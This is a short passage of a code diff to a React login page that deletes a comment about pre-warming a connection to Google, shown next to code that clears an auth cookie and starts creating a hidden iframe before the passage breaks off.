@@ -84,8 +84,6 @@ export default function LoginPage() {
       document.cookie = "auth_attempt=; max-age=0; path=/";
     }
   }, []);
-
-  // Pre-warm the connection to Google
   React.useEffect(() => {
     // Create hidden iframe to pre-establish connection
     const iframe = document.createElement('iframe');
